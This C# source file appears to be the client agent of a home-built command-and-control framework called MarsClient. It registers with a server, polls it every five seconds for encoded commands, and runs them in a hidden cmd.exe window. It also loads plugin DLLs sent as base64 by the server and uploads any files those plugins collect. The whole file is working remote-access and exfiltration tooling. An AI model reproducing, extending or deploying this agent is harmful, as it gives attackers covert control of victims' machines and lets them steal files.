﻿using System;
using System.Collections.Generic;
// per https://learn.microsoft.com/en-us/dotnet/csharp/tutorials/console-webapiclient
using System.Threading.Tasks;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Web;
using MarsClient.Plugins;

// testing running cmd
using System.Diagnostics;

namespace MarsClient
{
    public static class Client
    {   
        public static Communicator comm;
        // tasks enables threading for now
        public static async Task Main(string[] args)
        {
            //takes command line args of IP and Port
            int tport;
            string tipaddress;

            try {
                tport = Int32.Parse(args[1]);
                tipaddress = args[0];
                //Listener test = new Listener(args[0], tport, args[2]);
            } catch (System.IndexOutOfRangeException) {
                tport = 1234;
                tipaddress = "127.0.0.1";
                
                Console.WriteLine("MarsClient> No arguments provided, using defaults...");
            }

            comm = new Communicator(tipaddress, tport);

            //await Communicator.GetRequest(comm.host);
            await comm.RegisterAgent();

            // test command exeuction
            // this is a bit janky
            //System.Diagnostics.Process.Start("cmd.exe", "/c whoami");

            // run getcommand every 5 seconds
            int AgentCheckInterval = 5000;
            while (true) {
                if(comm.errored){
                    Console.WriteLine("Communicator> Error in communication, exiting!");
                    break;
                }
                await comm.GetCommand();
                await Task.Delay(AgentCheckInterval);
            }
        }
    }

    // class to chat with server with
    public class Communicator 
    {

        // declare http client 
        private static readonly HttpClient httpclient = new HttpClient();

        public string host {get; set;}
        public int port {get; set;}
        public Uri uri {get; set;}
        public bool errored {get; set;}
        public Communicator(string host, int port)
        {
            this.host = host;
            this.port = port;

            // build uri
            Uri uri = new Uri($"http://{this.host}:{this.port}");
            this.uri = uri;

            this.errored = false;
        }

        public static async Task GetRequest(string url)
        {
            // debug right now, just dumps response to console
            // per https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient.getasync?view=netcore-3.1
            // per https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpresponsemessage?view=netcore-3.1
            HttpResponseMessage response = await httpclient.GetAsync(url);
            response.EnsureSuccessStatusCode();
            string responseBody = await response.Content.ReadAsStringAsync();
            Console.WriteLine(responseBody);
        }

        // register agent with server
        public async Task RegisterAgent()
        {

            // get machine hostname
            string hostname = System.Environment.MachineName;
            // build httpcontent body with hostname
            string contentBody = $"{{\"hostname\": \"{hostname}\",\"register\": \"true\"}}";
            HttpContent content = new StringContent(contentBody);
            (bool sent, string body) = await this.BuildAndSendHTTPRequest(content);
            if (sent) {
                Console.WriteLine("Communicator> Agent completed inital registration with server.");
            } else {
                Console.WriteLine("Communicator> Agent failed to register with server.");
                this.errored = true;
            }

        }

        public async Task SendFileToServer(string filepath, string filename)
        {
            // file to base64
            byte[] bytes = File.ReadAllBytes(filepath);
            string file = Convert.ToBase64String(bytes);

            // echo file to console
            Console.WriteLine(file);

            // get machine hostname
            string hostname = System.Environment.MachineName;

            // file to server
            string responseBody = $"{{\"hostname\": \"{hostname}\",\"file\": \"{file}\",\"filename\": \"{filename}\"}}";
            Console.WriteLine($"body: {responseBody}");
            (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));

            if(l){
                //Console.WriteLine(a);
            }else{
                Console.WriteLine("failed to send file");
            }
        }

        public async Task GetCommand()
        {
            // get commands from server
            // by commands I mean json from server on what to do

             // get machine hostname
            string hostname = System.Environment.MachineName;
            // build httpcontent body with hostname
            string contentBody = $"{{\"hostname\": \"{hostname}\",\"command\": \"true\"}}";
            HttpContent content = new StringContent(contentBody);
            (bool sent, string body) = await this.BuildAndSendHTTPRequest(content);
            if (sent) {
                Console.WriteLine("Communicator> Agent successfully requested new command set.");

                // parse body json into a object
                // c# got mad when there was no class to pass this into
                // i now realize i could have used a base class lol
                CommandSet commandSet = JsonSerializer.Deserialize<CommandSet>(Base64DecodeString(body));
                
                // console log the command set for testing

                // execute commands
                
                // don't pass another shell to this command shell!!!
                foreach(dynamic[] command in commandSet.commands){
                    string result = "";
                    //var is called file, but it could be a command line command
                    string file = command[0].ToString();
                    string type = command[1].ToString();

                    if (type == "console"){
                        result = await ConsoleCommand(file);
                    } else if (type == "plugin") {
                        //the null here should be the parameters passed to the plugin that is being run
                        //result = PluginCommand(command[0], null);
                        //if (2 < command.Length){
                        try{
                            string[] pars = JsonSerializer.Deserialize<string[]>(command[3]);
                            if (pars != null && (pars.Length >= 1 && pars[0] != "")){
                                result = RunPluginCommandFromBase64(file, command[2].ToString(), pars);
                            } else {
                                result = RunPluginCommandFromBase64(file, command[2].ToString(), null);
                            }
                        } catch (Exception e) {
                            Console.WriteLine(e);
                            Console.WriteLine();
                            result = RunPluginCommandFromBase64(file, null, null);
                        }
                    } else {
                        result = "Failed! Server did not pass an expected command type.";
                    }
                    string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{Base64EncodeString(result)}\"}}";
                    (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
                }
            } else {
                Console.WriteLine("Communicator> Agent failed to fetch commands.");
            }
            
        }

        private string RunPluginCommandFromBase64(string binary, string command, string[]? plugParam){
            Plugin _plugin = PluginLoader.InitializeFromBase64(binary); 

            Console.WriteLine($"MarsClient> Plugin loaded: {_plugin.Name}");

            if(_plugin == null){
                return "Failed to load plugin. The plugin may be corrupt or not a valid plugin.";
            }

            IDictionary<string, dynamic> dll_return = _plugin.RunCommand(command, plugParam);
            string exit_message = dll_return["ExitMessage"];

            Console.WriteLine($"MarsClient> Plugin invoked: {_plugin.Name}");
            if(dll_return["ExitCode"] == 0){
                // send files API
                if (dll_return.TryGetValue("Files", out dynamic files)) {
                    Console.WriteLine("MarsClient> Sending files");
                    for (int i = 0; i < files.Length; i++) 
                    {
                        string filename = Path.GetFileName(files[i]);
                        this.SendFileToServer(files[i], filename);
                        Console.WriteLine($"MarsClient> Sent '{filename}' to server.");
                    }
                }
                Console.WriteLine($"MarsClient> Notifying server of successful plugin run: {_plugin.Name}");
                return $"Plugin {_plugin.Name} ran successfully: {exit_message}";
            }else{
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"MarsClient> Notifying server of failed plugin execution: {_plugin.Name}");
                Console.ResetColor();
                return $"Plugin {_plugin.Name} failed to run: {exit_message}";
                
            }

            return "Failed to run plugin!";
        }

        private async Task<string> ConsoleCommand(string command){
            //method to run a consolecommand and return it's result
            Console.WriteLine($"MarsClient> Executing command: {command}");
            // execute command
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.FileName = "cmd.exe";
                    startInfo.Arguments = $"/c {command}";
                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardOutput = true;
                    startInfo.CreateNoWindow = true;
                    using (Process process = Process.Start(startInfo))
                    {
                        using (StreamReader reader = process.StandardOutput)
                        {
                            string result = await reader.ReadToEndAsync();
                            //result = HttpUtility.UrlEncode(result);
                            Console.WriteLine(result);
                            return result;
                        }
                    }
        }

        public async Task<(bool,string)> BuildAndSendHTTPRequest(HttpContent content)
        {
            try{
                // send to server for registration
                HttpResponseMessage response = await httpclient.PostAsync(this.uri, content);
                response.EnsureSuccessStatusCode();

                //Console.WriteLine(await response.Content.ReadAsStringAsync());
                string body = await response.Content.ReadAsStringAsync();
                return (true, body);
            }
            catch (HttpRequestException e)
            {
                //Console.WriteLine("\nException Caught!");
                //Console.WriteLine("Message :{0} ",e.Message);

                return (false, "");
            }
        }
        private Byte[] Base64DecodeFile(string file){
            return Convert.FromBase64String(file);
        }

        private string Base64EncodeString(string str){
            //takes a string and returns it in base64
            return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
        }
        private string Base64DecodeString(string str){
            //takes a base64 string and returns it decoded
            var b_base64 = Convert.FromBase64String(str);
            return Encoding.UTF8.GetString(b_base64);
        }

        
    }

    // class to hold command set
    public class CommandSet
    {
        public LinkedList<dynamic[]> commands {get; set;}
    }

}
